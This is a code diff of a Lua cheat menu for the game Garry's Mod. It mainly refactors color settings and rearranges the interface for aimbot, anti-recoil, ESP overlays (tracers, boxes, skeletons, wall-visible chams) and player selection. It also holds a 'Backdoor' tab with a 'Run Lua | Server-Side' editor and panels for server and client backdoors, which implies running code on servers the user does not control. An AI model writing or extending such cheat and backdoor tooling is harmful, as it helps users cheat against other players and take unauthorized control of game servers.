@@ -27,23 +27,26 @@ local SelectedNet, SelectedPlr = "NONE", "NONE"
 local AimbotEnable, AimbotHook = false, wtf.gString(math.random(10, 220))
 local AntiRecoilEnable, AntiRecoilHook = false, wtf.gString(math.random(10, 220))
 local FovPos, FovHook  = { x = ScrW()/2, y = ScrH()/2 }, wtf.gString(math.random(10, 220))
-local FovCircle, FovColor = { 80 }, { r=255, g=255, b=255 }
+local FovCircle = { 80 }
 
 local LogPosY = 10
 local BDServerPosY, BDClientPosY = 5, 5
 local SoundPosX, SoundPosY = 17, 10
 local PlrPosX, PlrPosY, plr = 19, 10, nil
 
-local TracerColor = { r=255, g=255, b=255 }
-local DistanceColor = { r=255, g=255, b=255 }
-local NameColor = { r=255, g=255, b=255 }
-local NameDistColor = { r=255, g=255, b=255 }
-local WeaponColor = { r=255, g=255, b=255 }
-local Box2DColor = { r=255, g=255, b=255 }
-local Box3DColor = { r=255, g=255, b=255 }
-local SkeletonColor ={ r=255, g=255, b=255 }
-local ChamsColor = { r=255, g=255, b=255 }
-local EntityColor = { r=255, g=255, b=255 }
+local color = {
+    ['Tracer'] = Color(255, 255, 255),
+    ['Distance'] = Color(255, 255, 255),
+    ['Name'] = Color(255, 255, 255),
+    ['NameDist'] = Color(255, 255, 255),
+    ['Weapon'] = Color(255, 255, 255),
+    ['Box2D'] = Color(255, 255, 255),
+    ['Box3D'] = Color(255, 255, 255),
+    ['Skeleton'] = Color(255, 255, 255),
+    ['Chams'] = Color(255, 255, 255),
+    ['Entity'] = Color(255, 255, 255),
+    ['Fov'] = Color(255, 255, 255)
+}
 
 function Relay()
     local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
@@ -275,8 +278,8 @@ local function CreateTabButton(mat, x, y)
     Tabs[tab]:SetVisible(false)
     Tabs[tab]:SetDraggable(false)
     Tabs[tab]:SetTitle("")
-    Tabs[tab]:SetSize(515, 560)
     Tabs[tab]:SetPos(95, 10)
+    Tabs[tab]:SetSize(515, 560)
     Tabs[tab].Paint = function(self, w, h)
         draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
         surface.SetDrawColor(Color(15,15,15,255))
@@ -284,25 +287,6 @@ local function CreateTabButton(mat, x, y)
     end
 
     return { Tabs[tab], TabButtons[btn] }
-end
-
-local VisualsTab = CreateTabButton(wtf.Materials.V, 13, 5)
-local MiscTab = CreateTabButton(wtf.Materials.M, 13, 85)
-local PlayersTab = CreateTabButton(wtf.Materials.P, 13, 165)
-local BackdoorTab = CreateTabButton(wtf.Materials.B, 13, 245)
-local SoundsTab = CreateTabButton(wtf.Materials.S, 13, 325)
-
-local LuaEditor=vgui.Create("DTextEntry", BackdoorTab[1])
-LuaEditor:SetPos(10, 325)
-LuaEditor:AllowInput()
-LuaEditor:SetSize(495, 185)
-LuaEditor:SetValue("Run Lua | Server-Side")
-LuaEditor:SetMultiline(true)
-LuaEditor.Paint = function(self, w, h)
-    surface.SetDrawColor(15, 15, 15, 255)
-    surface.DrawOutlinedRect(0, 0, w, h)
-    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
-    self:SetFont('Trebuchet18')
 end
 
 local function CreatePanel(tab, width, height, x, y)
@@ -332,12 +316,275 @@ local function CreateButton(name, tab, width, height, x, y, func)
     end
 end
 
---/ init panels for later functions
+local function CreateCheckbox(name, tab, x, y, func)
+    local Frame=vgui.Create("DFrame", tab)
+    Frame:SetSize(110,25)
+    Frame:SetPos(x,y)
+    Frame:SetDraggable(false)
+    Frame:ShowCloseButton(false)
+    Frame:SetTitle("")
+    Frame.Paint = function(self, w,h)
+        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
+        surface.SetDrawColor(40, 40, 40, 255)
+        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+    end
+
+    local Checkbox = Frame:Add("DCheckBoxLabel")
+    Checkbox:SetPos(5,5)
+    Checkbox:SetText(name)
+    Checkbox:SetDark(true)
+    Checkbox.OnChange = func
+    Checkbox.Paint = function(self, w, h)
+        self:SetTextColor(Color(255,255,255))
+    end
+end
+
+local function CreateSlider(name, table, tab, max, min, x, y)
+    local Frame=vgui.Create("DFrame", tab)
+    Frame:SetSize(110,25)
+    Frame:SetPos(x, y)
+    Frame:SetDraggable(false)
+    Frame:ShowCloseButton(false)
+    Frame:SetVisible(true)
+    Frame:SetTitle(" ")
+    Frame.Paint = function(self, w,h)
+        surface.SetDrawColor(Color(15,15,15,255))
+        surface.DrawOutlinedRect(0,0,w,h)
+        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+    end
+
+    local Slider=vgui.Create("DNumSlider", Frame)
+    Slider:SetText(name)
+    Slider:SetMin(min)
+    Slider:SetMax(max)
+    Slider:SetSize(120, 10)
+    Slider:SetPos(5, 5)
+    Slider:SetDecimals(0)
+    Slider:SetDark(true)
+    Slider:SetValue(table[1])
+    Slider.OnValueChanged = function(self, value)
+        table[1]=self:GetValue()
+    end
+
+    return { Frame, Slider }
+end
+
+local function CreateColorSlider(name, color, tab, x, y)
+    local Frame=vgui.Create("DFrame", tab)
+    Frame:SetSize(120,85)
+    Frame:SetPos(x,y)
+    Frame:SetDraggable(false)
+    Frame:ShowCloseButton(false)
+    Frame:SetTitle(name)
+    Frame.Paint = function(self, w,h)
+        surface.SetDrawColor(Color(15,15,15,255))
+        surface.DrawOutlinedRect(0,0,w,h)
+        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+    end
+
+    local ColorR=vgui.Create("DNumSlider", Frame)
+    ColorR:SetText("Red:");
+    ColorR:SetMin(0);
+    ColorR:SetMax(255)
+    ColorR:SetSize(125, 10)
+    ColorR:SetPos(10,25)
+    ColorR:SetDecimals(0)
+    ColorR:SetDark(true)
+    ColorR:SetValue(color.r)
+    ColorR.OnValueChanged = function(self, value)
+        color.r=self:GetValue()
+    end
+
+    local ColorG=vgui.Create("DNumSlider", Frame)
+    ColorG:SetText("Green:")
+    ColorG:SetMin(0);
+    ColorG:SetMax(255)
+    ColorG:SetSize(125, 10)
+    ColorG:SetPos(10,45)
+    ColorG:SetDecimals(0)
+    ColorG:SetDark(true)
+    ColorG:SetValue(color.g)
+    ColorG.OnValueChanged = function(self, value)
+        color.g=self:GetValue()
+    end
+
+    local ColorB=vgui.Create("DNumSlider", Frame)
+    ColorB:SetText("Blue:");
+    ColorB:SetMin(0);
+    ColorB:SetMax(255)
+    ColorB:SetSize(125, 10)
+    ColorB:SetPos(10,65)
+    ColorB:SetDecimals(0)
+    ColorB:SetValue(color.b)
+    ColorB:SetDark(true)
+    ColorB.OnValueChanged = function(self, value)
+        color.b=self:GetValue()
+    end
+
+    function Update()
+        ColorR:SetValue(color.r)
+        ColorG:SetValue(color.g)
+        ColorG:SetValue(color.b)
+        UpdateColors = false
+    end
+
+    external = {}
+    external['Update'] = Update
+    return external
+end
+
+--/ Tabs
+local VisualsTab = CreateTabButton(wtf.Materials.V, 13, 5)
+local MiscTab = CreateTabButton(wtf.Materials.M, 13, 85)
+local PlayersTab = CreateTabButton(wtf.Materials.P, 13, 165)
+local BackdoorTab = CreateTabButton(wtf.Materials.B, 13, 245)
+local SoundsTab = CreateTabButton(wtf.Materials.S, 13, 325)
+
+--/ Panels
 local PlayerPanel=CreatePanel(PlayersTab[1], 495, 540, 10, 10)
 local EntityPanel=CreatePanel(VisualsTab[1], 490, 350, 15, 190)
 local SoundPanel=CreatePanel(SoundsTab[1], 495, 505, 10, 10)
-local ServerBDPanel=CreatePanel(BackdoorTab[1], 225, 280, 20, 35)
-local ClientBDPanel=CreatePanel(BackdoorTab[1], 225, 280, 270, 35)
+local ServerBDPanel=CreatePanel(BackdoorTab[1], 225, 300, 20, 15)
+local ClientBDPanel=CreatePanel(BackdoorTab[1], 225, 300, 270, 15)
+
+--/ Color Silders
+local TracerSlider = CreateColorSlider("Tracer-Editor", color['Tracer'], MiscTab[1], 9, 280)
+local DistanceSlider = CreateColorSlider("Distance-Editor", color['Distance'], MiscTab[1], 134, 280)
+local NameSlider = CreateColorSlider("Name-Editor", color['Name'], MiscTab[1], 259, 280)
+local WeaponSlider = CreateColorSlider("Weapon-Editor", color['Weapon'], MiscTab[1], 384, 280)
+local Box2DSlider = CreateColorSlider("Box-2D-Editor", color['Box2D'], MiscTab[1],  9, 370)
+local Box3DSlider = CreateColorSlider("Box-3D-Editor", color['Box3D'], MiscTab[1], 134, 370)
+local SkeletonSlider = CreateColorSlider("Skeleton-Editor", color['Skeleton'], MiscTab[1], 259, 370)
+local ChamsSlider = CreateColorSlider("Chams-Editor", color['Chams'], MiscTab[1], 384, 370)
+local EntitySlider = CreateColorSlider("Entity-Editor", color['Entity'], MiscTab[1], 9, 460)
+local FovSlider = CreateColorSlider("Fov-Editor", color['Fov'], MiscTab[1], 134, 460)
+local NameDistSlider = CreateColorSlider("Name/Dist-Editor", color['NameDist'], MiscTab[1], 259, 460)
+
+local EntOnList = vgui.Create("DListView", EntityPanel[1])
+EntOnList:SetPos( 245, 0)
+EntOnList:SetSize( 245, 349 )
+EntOnList:SetMultiSelect(false)
+EntOnList:AddColumn("Whitelisted Entities")
+EntOnList:SetHideHeaders(true)
+EntOnList.Paint = function(self,w,h)
+    surface.SetDrawColor(Color(0,0,0,0))
+    surface.DrawOutlinedRect(0,0,w,h)
+end
+
+local EntOffList = vgui.Create("DListView", EntityPanel[1])
+EntOffList:SetPos( 0, 0 )
+EntOffList:SetSize( 245, 348 )
+EntOffList:SetMultiSelect(false)
+EntOffList:SetHideHeaders(true)
+EntOffList:AddColumn("Whitelist Entities")
+EntOffList.Paint = function(self,w,h)
+  surface.SetDrawColor(Color(0,0,0,0))
+  surface.DrawOutlinedRect(0,0,w,h)
+end
+function EntOffList:DoDoubleClick()
+    table.insert( EntList, EntOffList:GetLine(EntOffList:GetSelectedLine()):GetValue(1) )
+end
+
+function RefreshEntList()
+    EntOnList:Clear(); EntOffList:Clear()
+    for k, v in pairs(EntList) do
+        EntOnList:AddLine(v)
+    end
+
+    for k, v in pairs(ents.GetAll()) do
+        local name = v:GetClass()
+        local copy = false
+        if name ~= "player" then
+            if not table.HasValue( EntList, name ) then
+                for k, v in pairs (EntOffList:GetLines() ) do
+                    if v:GetValue(1) == name then copy = true end
+                end
+                if copy == false then EntOffList:AddLine(name) end
+            end
+        end
+    end
+end; RefreshEntList()
+
+local function PopulatePlayers()
+    for k,v in pairs(player.GetAll()) do
+        local Frame = vgui.Create("DFrame", PlayerPanel[1])
+        Frame:SetPos(PlrPosX, PlrPosY)
+        Frame:SetSize(145, 140)
+        Frame:SetTitle(" ")
+        Frame:SetDraggable(false)
+        Frame:ShowCloseButton(false)
+        Frame.Paint = function(self, w, h)
+            surface.SetDrawColor(Color(15,15,15,255))
+            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+            draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
+        end
+
+        local LabelButton = vgui.Create("DButton", Frame)
+        LabelButton:SetText("Select " .. v:Nick())
+        LabelButton:SetColor(Color(255,255,255))
+        LabelButton:SetSize(115, 30)
+        LabelButton:SetPos(15, 100)
+        LabelButton.Paint = function(self, w, h)
+            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
+            surface.SetDrawColor(40, 40, 40, 255)
+            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+            self:SetTextColor(Color(255,255,255))
+        end
+        LabelButton.DoClick = function()
+            plr = v:UserID()
+            if wtf.CheckPlr() then
+                wtf.Log("Player: "..Player(plr):Nick().." Selected")
+                wtf.conoutRGB("SELECTED PLAYER: "..Player(plr):Nick())
+            end
+        end
+
+        local AvatarFrame = vgui.Create("DFrame", Frame)
+        AvatarFrame:SetSize(82, 82)
+        AvatarFrame:SetPos(31, 10)
+        AvatarFrame:SetTitle(" ")
+        AvatarFrame:SetDraggable(false)
+        AvatarFrame:ShowCloseButton(false)
+        AvatarFrame.Paint = function(self, w, h)
+            draw.RoundedBox(0,0,0,w,h,Color(0,0,0, 255))
+        end
+
+        local Avatar = vgui.Create( "AvatarImage", AvatarFrame)
+        Avatar:SetSize(80, 80)
+        Avatar:Center()
+        Avatar:SetPlayer(v, 128)
+        Avatar.Paint = function(self, w, h)
+            draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255))
+        end
+
+        PlrPosX=PlrPosX+155
+        if PlrPosX==484 then
+            PlrPosX=19
+            PlrPosY=PlrPosY+150
+        end
+    end
+end; PopulatePlayers()
+
+local RefreshDelay = 5
+hook.Add("Think", RefreshHook, function()
+    if CurTime() < RefreshDelay then return end
+    RefreshDelay = CurTime() + 5
+    PlayerPanel[1]:GetCanvas():Clear()
+    PlrPosX, PlrPosY = 19, 10
+    PopulatePlayers()
+end)
+
+local LuaEditor=vgui.Create("DTextEntry", BackdoorTab[1])
+LuaEditor:SetPos(10, 325)
+LuaEditor:AllowInput()
+LuaEditor:SetSize(495, 185)
+LuaEditor:SetValue("Run Lua | Server-Side")
+LuaEditor:SetMultiline(true)
+LuaEditor.Paint = function(self, w, h)
+    surface.SetDrawColor(15, 15, 15, 255)
+    surface.DrawOutlinedRect(0, 0, w, h)
+    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
+    self:SetFont('Trebuchet18')
+end
 
 local function CreateBDServer(name, func)
     Button=vgui.Create("DButton", ServerBDPanel[1])
@@ -429,244 +676,6 @@ local function CreateSoundButtons()
     end
 end
 
-local function CreateCheckbox(name, tab, x, y, func)
-    local Frame=vgui.Create("DFrame", tab)
-    Frame:SetSize(110,25)
-    Frame:SetPos(x,y)
-    Frame:SetDraggable(false)
-    Frame:ShowCloseButton(false)
-    Frame:SetTitle("")
-    Frame.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-    end
-
-    local Checkbox = Frame:Add("DCheckBoxLabel")
-    Checkbox:SetPos(5,5)
-    Checkbox:SetText(name)
-    Checkbox:SetDark(true)
-    Checkbox.OnChange = func
-    Checkbox.Paint = function(self, w, h)
-        self:SetTextColor(Color(255,255,255))
-    end
-end
-
-local function CreateSlider(name, table, tab, max, min, x, y)
-    local Frame=vgui.Create("DFrame", tab)
-    Frame:SetSize(110,25)
-    Frame:SetPos(x, y)
-    Frame:SetDraggable(false)
-    Frame:ShowCloseButton(false)
-    Frame:SetVisible(true)
-    Frame:SetTitle(" ")
-    Frame.Paint = function(self, w,h)
-        surface.SetDrawColor(Color(15,15,15,255))
-        surface.DrawOutlinedRect(0,0,w,h)
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-    end
-
-    local Slider=vgui.Create("DNumSlider", Frame)
-    Slider:SetText(name)
-    Slider:SetMin(min)
-    Slider:SetMax(max)
-    Slider:SetSize(120, 10)
-    Slider:SetPos(5, 5)
-    Slider:SetDecimals(0)
-    Slider:SetDark(true)
-    Slider:SetValue(table[1])
-    Slider.OnValueChanged = function(self, value)
-        table[1]=self:GetValue()
-    end
-
-    return { Frame, Slider }
-end
-
-local function CreateColorSlider(name, color, tab, x, y)
-    local Frame=vgui.Create("DFrame", tab)
-    Frame:SetSize(120,85)
-    Frame:SetPos(x,y)
-    Frame:SetDraggable(false)
-    Frame:ShowCloseButton(false)
-    Frame:SetTitle(name)
-    Frame.Paint = function(self, w,h)
-        surface.SetDrawColor(Color(15,15,15,255))
-        surface.DrawOutlinedRect(0,0,w,h)
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-    end
-
-    local ColorR=vgui.Create("DNumSlider", Frame)
-    ColorR:SetText("Red:");
-    ColorR:SetMin(0);
-    ColorR:SetMax(255)
-    ColorR:SetSize(125, 10)
-    ColorR:SetPos(10,25)
-    ColorR:SetDecimals(0)
-    ColorR:SetDark(true)
-    ColorR.OnValueChanged = function(self, value)
-        color.r=self:GetValue()
-    end
-
-    local ColorG=vgui.Create("DNumSlider", Frame)
-    ColorG:SetText("Green:")
-    ColorG:SetMin(0);
-    ColorG:SetMax(255)
-    ColorG:SetSize(125, 10)
-    ColorG:SetPos(10,45)
-    ColorG:SetDecimals(0)
-    ColorG:SetDark(true)
-    ColorG.OnValueChanged = function(self, value)
-        color.g=self:GetValue()
-    end
-
-    local ColorB=vgui.Create("DNumSlider", Frame)
-    ColorB:SetText("Blue:");
-    ColorB:SetMin(0);
-    ColorB:SetMax(255)
-    ColorB:SetSize(125, 10)
-    ColorB:SetPos(10,65)
-    ColorB:SetDecimals(0)
-    ColorB:SetDark(true)
-    ColorB.OnValueChanged = function(self, value)
-        color.b=self:GetValue()
-    end
-
-    local function UpdateColorValues()
-        if(ColorR:GetValue() ~= color.r) then ColorR:SetValue(color.r) end
-        if(ColorG:GetValue() ~= color.g) then ColorG:SetValue(color.g) end
-        if(ColorB:GetValue() ~= color.b) then ColorB:SetValue(color.b) end
-    end; UpdateColorValues()
-
-    return { ColorR, ColorG, ColorB }
-end
-
-local function PopulatePlayers()
-    for k,v in pairs(player.GetAll()) do
-        local Frame = vgui.Create("DFrame", PlayerPanel[1])
-        Frame:SetPos(PlrPosX, PlrPosY)
-        Frame:SetSize(145, 140)
-        Frame:SetTitle(" ")
-        Frame:SetDraggable(false)
-        Frame:ShowCloseButton(false)
-        Frame.Paint = function(self, w, h)
-            surface.SetDrawColor(Color(15,15,15,255))
-            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-            draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
-        end
-
-        local LabelButton = vgui.Create("DButton", Frame)
-        LabelButton:SetText("Select " .. v:Nick())
-        LabelButton:SetColor(Color(255,255,255))
-        LabelButton:SetSize(115, 30)
-        LabelButton:SetPos(15, 100)
-        LabelButton.Paint = function(self, w, h)
-            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
-            surface.SetDrawColor(40, 40, 40, 255)
-            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-            self:SetTextColor(Color(255,255,255))
-        end
-        LabelButton.DoClick = function()
-            plr = v:UserID()
-            if wtf.CheckPlr() then
-                wtf.Log("Player: "..Player(plr):Nick().." Selected")
-                wtf.conoutRGB("SELECTED PLAYER: "..Player(plr):Nick())
-            end
-        end
-
-        local AvatarFrame = vgui.Create("DFrame", Frame)
-        AvatarFrame:SetSize(82, 82)
-        AvatarFrame:SetPos(31, 10)
-        AvatarFrame:SetTitle(" ")
-        AvatarFrame:SetDraggable(false)
-        AvatarFrame:ShowCloseButton(false)
-        AvatarFrame.Paint = function(self, w, h)
-            draw.RoundedBox(0,0,0,w,h,Color(0,0,0, 255))
-        end
-
-        local Avatar = vgui.Create( "AvatarImage", AvatarFrame)
-        Avatar:SetSize(80, 80)
-        Avatar:Center()
-        Avatar:SetPlayer(v, 128)
-        Avatar.Paint = function(self, w, h)
-            draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255))
-        end
-
-        PlrPosX=PlrPosX+155
-        if PlrPosX==484 then
-            PlrPosX=19
-            PlrPosY=PlrPosY+150
-        end
-    end
-end
-
-PopulatePlayers()
-
-local RefreshDelay = 5
-hook.Add("Think", RefreshHook, function()
-    if CurTime() < RefreshDelay then return end
-    RefreshDelay = CurTime() + 5
-    PlayerPanel[1]:GetCanvas():Clear()
-    PlrPosX, PlrPosY = 19, 10
-    PopulatePlayers()
-end)
-
-local EntOnList = vgui.Create("DListView", EntityPanel[1])
-EntOnList:SetPos( 220, 0)
-EntOnList:SetSize( 220, 349 )
-EntOnList:SetMultiSelect(false)
-EntOnList:AddColumn("Whitelisted Entities")
-EntOnList:SetHideHeaders(true)
-EntOnList.Paint = function(self,w,h)
-    surface.SetDrawColor(Color(0,0,0,0))
-    surface.DrawOutlinedRect(0,0,w,h)
-end
-
-local EntOffList = vgui.Create("DListView", EntityPanel[1])
-EntOffList:SetPos( 0, 0 )
-EntOffList:SetSize( 220, 348 )
-EntOffList:SetMultiSelect(false)
-EntOffList:SetHideHeaders(true)
-EntOffList:AddColumn("Whitelist Entities")
-EntOffList.Paint = function(self,w,h)
-  surface.SetDrawColor(Color(0,0,0,0))
-  surface.DrawOutlinedRect(0,0,w,h)
-end
-function EntOffList:DoDoubleClick()
-    table.insert( EntList, EntOffList:GetLine(EntOffList:GetSelectedLine()):GetValue(1) )
-end
-
-function RefreshEntList()
-    EntOnList:Clear(); EntOffList:Clear()
-    for k, v in pairs(EntList) do
-        EntOnList:AddLine(v)
-    end
-
-    for k, v in pairs(ents.GetAll()) do
-        local name = v:GetClass()
-        local copy = false
-        if name ~= "player" then
-            if not table.HasValue( EntList, name ) then
-                for k, v in pairs (EntOffList:GetLines() ) do
-                    if v:GetValue(1) == name then copy = true end
-                end
-                if copy == false then EntOffList:AddLine(name) end
-            end
-        end
-    end
-end; RefreshEntList()
-
-local TracerSlider = CreateColorSlider("Tracer-Editor", TracerColor, MiscTab[1], 9, 280)
-local DistanceSlider = CreateColorSlider("Distance-Editor", DistanceColor, MiscTab[1], 134, 280)
-local NameSlider = CreateColorSlider("Name-Editor", NameColor, MiscTab[1], 259, 280)
-local WeaponSlider = CreateColorSlider("Weapon-Editor", WeaponColor, MiscTab[1], 384, 280)
-local Box2DSlider = CreateColorSlider("Box-2D-Editor", Box2DColor, MiscTab[1],  9, 370)
-local Box3DSlider = CreateColorSlider("Box-3D-Editor", Box3DColor, MiscTab[1], 134, 370)
-local SkeletonSlider = CreateColorSlider("Skeleton-Editor", SkeletonColor, MiscTab[1], 259, 370)
-local ChamsSlider = CreateColorSlider("Chams-Editor", ChamsColor, MiscTab[1], 384, 370)
-local EntitySlider = CreateColorSlider("Entity-Editor", EntityColor, MiscTab[1], 9, 460)
-local FovSlider = CreateColorSlider("Fov-Editor", FovColor, MiscTab[1], 134, 460)
-local NameDistSlider = CreateColorSlider("Name/Dist-Editor", NameDistColor, MiscTab[1], 259, 460)
-
 local FC={}
 FC.Enabled=false
 FC.Hook=wtf.gString(math.random(10, 220))
@@ -749,13 +758,13 @@ hook.Add("HUDPaint", EspHook, function()
                     if EntNameEnable then
                         local name = ent:GetClass()
                         local position = (ent:GetPos() + Vector(0,0,5)):ToScreen()
-                        draw.SimpleText(name, "Default", position.x,position.y,Color(EntityColor.r, EntityColor.g, EntityColor.b), TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
+                        draw.SimpleText(name, "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                     end
 
                     if EntDistanceEnable then
                         local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                         local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
-                        draw.SimpleText(distance, "Default", position.x,position.y,Color(EntityColor.r, EntityColor.g, EntityColor.b), TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
+                        draw.SimpleText(distance, "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                     end
 
                     if Ent3DEnable then
@@ -764,7 +773,7 @@ hook.Add("HUDPaint", EspHook, function()
                         local min, max = ent:WorldSpaceAABB()
                         local origin = ent:GetPos()
                         cam.Start3D()
-                            render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, Color(EntityColor.r, EntityColor.g, EntityColor.b) )
+                            render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, color['Entity'] )
                         cam.End3D()
                         end
                     end
@@ -778,28 +787,28 @@ hook.Add("HUDPaint", EspHook, function()
             local ent=v
 
             if TracerEnable then
-                surface.SetDrawColor(Color(TracerColor.r, TracerColor.b, TracerColor.g))
+                surface.SetDrawColor(color['Tracer'])
                 surface.DrawLine(ScrW()/2,ScrH(),v:GetPos():ToScreen().x,v:GetPos():ToScreen().y)
             end
 
             if NameEnable and DistanceEnable then
                 local position = (v:GetPos() + Vector(0,0,80)):ToScreen()
                 local distance = math.Round(v:GetPos():Distance(LocalPlayer():GetPos()))
-                draw.SimpleText(v:Nick().." ["..distance.."]", "Default", position.x, position.y, Color(NameDistColor.r, NameDistColor.g, NameDistColor.b), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                draw.SimpleText(v:Nick().." ["..distance.."]", "Default", position.x, position.y, color['Name'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
             end
 
             if DistanceEnable then
                 if !NameEnable then
                     local position = (v:GetPos() + Vector(0,0,80)):ToScreen()
                     local distance = math.Round(v:GetPos():Distance(LocalPlayer():GetPos()))
-                    draw.SimpleText(distance, "Default", position.x, position.y, Color(DistanceColor.r, DistanceColor.g, DistanceColor.b), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                    draw.SimpleText(distance, "Default", position.x, position.y, color['Distance'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                 end
             end
 
             if NameEnable then
                 if !DistanceEnable then
                     local position = (v:GetPos() + Vector(0,0,80)):ToScreen()
-                    draw.SimpleText(v:Nick(), "Default", position.x, position.y, Color(NameColor.r, NameColor.g, NameColor.b), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                    draw.SimpleText(v:Nick(), "Default", position.x, position.y, color['Name'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                 end
             end
 
@@ -807,7 +816,7 @@ hook.Add("HUDPaint", EspHook, function()
                 if ent:GetActiveWeapon():IsValid() then
                     local weapon_name=ent:GetActiveWeapon():GetPrintName()
                     local Position = (v:GetPos() + Vector(0,0,-15)):ToScreen()
-                    draw.SimpleText(weapon_name, "Default", Position.x, Position.y, Color(WeaponColor.r, WeaponColor.g, WeaponColor.b), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
+                    draw.SimpleText(weapon_name, "Default", Position.x, Position.y, color['Weapon'], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
                 end
             end
 
@@ -817,7 +826,7 @@ hook.Add("HUDPaint", EspHook, function()
                 local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
                 local middle = bottom.y - top.y
                 local width = middle / 2.425
-                surface.SetDrawColor(Color(Box2DColor.r, Box2DColor.g, Box2DColor.b))
+                surface.SetDrawColor(color['Box2D'])
                 surface.DrawOutlinedRect(bottom.x - width, top.y, width * 1.85, middle)
             end
 
@@ -832,7 +841,7 @@ hook.Add("HUDPaint", EspHook, function()
                 end
 
                 if Continue then
-                    surface.SetDrawColor(Color(SkeletonColor.r, SkeletonColor.g, SkeletonColor.b))
+                    surface.SetDrawColor(color['Skeleton'])
                     surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
                     surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
                     surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
@@ -853,7 +862,7 @@ hook.Add("HUDPaint", EspHook, function()
                 local origin = ent:GetPos()
 
                 cam.Start3D()
-                    render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, Color(Box3DColor.r, Box3DColor.g, Box3DColor.b) )
+                    render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, color['Box3D'] )
                 cam.End3D()
             end
 
@@ -874,24 +883,24 @@ hook.Add("HUDPaint", EspHook, function()
                 cam.End3D()
 
                 if weapon:IsValid() then
-                cam.Start3D()
-                    render.MaterialOverride(chams01)
-                    render.SetColorModulation(ChamsColor.r/255, ChamsColor.g/255, ChamsColor.b/255, 255)
-                    entitym.DrawModel(weapon)
-                    render.SetColorModulation(ChamsColor.r/170, ChamsColor.g/170, ChamsColor.b/170, 255)
-                    render.MaterialOverride(chams02)
-                    entitym.DrawModel(weapon)
-                cam.End3D()
+                    cam.Start3D()
+                        render.MaterialOverride(chams01)
+                        render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255, 255)
+                        entitym.DrawModel(weapon)
+                        render.SetColorModulation(color['Chams'].r/170, color['Chams'].g/170, color['Chams'].b/170, 255)
+                        render.MaterialOverride(chams02)
+                        entitym.DrawModel(weapon)
+                    cam.End3D()
 
-                cam.Start3D()
-                    render.MaterialOverride(chams01)
-                    render.SetColorModulation(ChamsColor.r/255, ChamsColor.g/255, ChamsColor.b/255)
-                    entitym.DrawModel(v)
-                    render.SetColorModulation(ChamsColor.r/255, ChamsColor.g/255, ChamsColor.b/255)
-                    render.MaterialOverride(chams02)
-                    entitym.DrawModel(v)
-                    render.SetColorModulation(1, 1, 1)
-                cam.End3D()
+                    cam.Start3D()
+                        render.MaterialOverride(chams01)
+                        render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255)
+                        entitym.DrawModel(v)
+                        render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255)
+                        render.MaterialOverride(chams02)
+                        entitym.DrawModel(v)
+                        render.SetColorModulation(1, 1, 1)
+                    cam.End3D()
                 end
             end
         end
@@ -900,7 +909,7 @@ end)
 
 hook.Add("HUDPaint", FovHook, function()
 		if AimbotEnable then
-        surface.DrawCircle(FovPos.x, FovPos.y, FovCircle[1], Color(FovColor.r, FovColor.g, FovColor.b))
